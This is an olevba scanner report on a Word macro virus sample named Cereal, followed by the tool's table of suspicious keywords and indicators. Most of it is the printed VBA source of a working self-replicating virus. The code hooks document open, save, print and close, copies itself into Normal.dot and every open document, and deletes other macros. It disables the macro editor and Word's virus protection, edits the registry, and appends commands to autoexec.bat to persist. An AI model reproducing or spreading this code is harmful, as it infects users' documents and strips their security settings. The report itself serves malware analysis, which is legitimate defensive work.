olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cereal-50883f7371e0e28bf617b62a67b52c39b0b2b42f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cereal-50883f7371e0e28bf617b62a67b52c39b0b2b42f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cereal.bas 
in file: Virus.MSWord.Cereal-50883f7371e0e28bf617b62a67b52c39b0b2b42f - OLE stream: 'Macros/VBA/Cereal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Call stealth
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoExec()
    Call stealth
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Application.UserName = "Cereal"
    Application.UserAddress = "Cereal"
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call clascopy
End Sub
Sub AutoExit()
    On Error Resume Next
    Call clascopy
    Application.Quit
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" _
    And ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" And _
    ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    Call payload
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub

Sub clascopy()
   On Error Resume Next
   Call stealth
    infected = False
        For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
                modname = NormalTemplate.VBProject.VBComponents(A_A).Name
                If modname = "Cereal" Then
                    infected = True
                    e = NormalTemplate.VBProject.VBComponents(2).CodeModule.countoflines
                    vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                End If
                If (modname <> "Cereal") And (modname <> "ThisDocument") Then
                    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
        Next A_A
        For Each documentopen In Documents
            Docinfected = False
            With documentopen
                 For Cerealclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                    modname = documentopen.VBProject.VBComponents(Cerealclaw).Name
                    If modname = "Cereal" Then
                          Docinfected = True
                          e = documentopen.VBProject.VBComponents(2).CodeModule.countoflines
                          vircode = documentopen.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    End If
                    If (modname <> "Cereal") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                        Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                    End If
                Next Cerealclaw
                If Docinfected = False Then
                     documentopen.VBProject.VBComponents.Add(1).Name = "Cereal"
                     e = NormalTemplate.VBProject.VBComponents(2).CodeModule.countoflines
                     vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                     documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                End If
            End With
        Next documentopen
            If infected = False Then
                    NormalTemplate.VBProject.VBComponents.Add(1).Name = "Cereal"
                    e = ActiveDocument.VBProject.VBComponents(2).CodeModule.countoflines
                    vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode & "'Infected Date :==> " & Date
                    NormalTemplate.Save
            End If

End Sub
Sub stealth()
   On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    Application.UserName = "Cereal"
    Application.UserAddress = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Author = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Title = "Cereal"
    Dialogs(wdDialogFileSummaryInfo).Execute
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "retupmoC yM"
    Hack = Shell("c:\windows\command\xcopy.exe /I " & Chr(34) & NormalTemplate.Path & "\normal.dot" & Chr(34) & " c:\windows\cereal.sys", vbHide)
    Call stealth2
End Sub

Sub stealth2()
    On Error Resume Next
    auto$ = Dir("c:\autoexec.bat")
    startwrite = FreeFile
    If auto$ <> "" Then
        ChDir ("c:\")
        Open auto$ For Input As startwrite
        While Not EOF(startwrite)
            Input #startwrite, batcode
            mypos = InStr(1, batcode, "cereal.sys") ' Returns 0.
        Wend
        Close #1
        If mypos = 0 Then
            Open auto$ For Append Access Write As startwrite
            Print #startwrite, "@echo off"
            Print #startwrite, "del " & Chr(34) & NormalTemplate.Path & "\Normal.dot" & Chr(34)
            Print #startwrite, "copy c:\windows\cereal.sys " & Chr(34) & NormalTemplate.Path & "\Normal.dot" & Chr(34)
            Close #startwrite
        End If
    End If
End Sub
'Infected Date :==> 31/12/99

'Infected Date :==> 11.05.99

'Infected Date :==> 24/01/00

'Infected Date :==> 07.03.01


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |documentopen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |xcopy.exe           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
